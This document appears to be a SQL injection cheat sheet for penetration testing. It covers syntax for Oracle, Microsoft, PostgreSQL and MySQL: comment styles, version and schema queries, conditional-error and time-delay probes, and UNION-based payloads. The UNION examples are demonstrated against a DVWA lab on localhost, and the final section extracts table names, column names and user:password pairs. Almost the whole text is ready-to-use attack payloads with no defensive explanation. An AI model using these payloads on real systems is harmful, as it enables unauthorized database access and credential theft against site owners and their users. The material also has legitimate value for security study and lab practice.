#### comments

| syntax | type |
|:---:|:---:|
|```--comment```|*oracle, microsoft, postgresql*|
|```-- comment```|*mysql*|
|```/*comment*/```|*microsoft, postgresql, mysql*|

-----


#### string concatenation

| syntax | type |
|:---:|:---:|
|```'foo'\|\|'bar'```|*oracle, postgresql*|
|```'foo'+'bar'```|*microsoft*|
|```'foo' 'bar'```|*mysql*|
|```CONCAT('foo','bar')```|*mysql*|

-----


#### version

| syntax | type |
|:---:|:---:|
|```SELECT version FROM v$instance```|*oracle*|
|```SELECT banner from v$instance```|*oracle*|
|```SELECT @@version```|*microsoft, mysql*|
|```SELECT version()```|*postgresql*|

-----


#### database contents

| syntax | type |
|:---:|:---:|
|```SELECT * FROM all_tables```|*oracle*|
|```SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'```|*oracle*|
|```SELECT * FROM information_schema.tables```|*microsoft, postgresql, mysql*|
|```SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'```|*microsoft, postgresql, mysql*|

-----


#### conditional errors

| syntax | type |
|:---:|:---:|
|```SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN to_char(1/0) ELSE NULL END FROM dual```|*oracle*|
|```SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END```|*microsoft*|
|```SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN cast(1/0 as text) ELSE NULL END```|*postgresql*|
|```SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a')```|*mysql*|

-----


#### time delays

| syntax | type |
|:---:|:---:|
|```dbms_pipe.receive_message(('a'),10)```|*oracle*|
|```WAITFOR DELAY '0:0:10'```|*microsoft*|
|```SELECT pg_sleep(10)```|*postgresql*|
|```SELECT sleep(10)```|*mysql*|

-----


#### union statements

*web app*

```SELECT first_name, last_name FROM users UNION SELECT username, password FROM login;```

*attack: http://localhost:81/dvwa/vulnerabilities/sqli/?id=1%27+UNION+SELECT+1%3B--*

```User ID: 1’ UNION SELECT 1;- -``` *no data different number of columns*

*attack: http://localhost:81/dvwa/vulnerabilities/sqli/?id=1%27+UNION+SELECT+1,2%3B--*

```User ID: 1’ UNION SELECT 1,2;- -``` *returns data (number of columns match)*

-----


#### enumeration

*extract list of tables*

```1' UNION SELECT 1,table_name FROM information_schema.tables;- -```

*extract column names*

```1' UNION SELECT 1,column_name FROM information_schema.columns;- -```

*concat and extract data*

```1' UNION SELECT 1,concat(user,':',password) FROM users;- -```
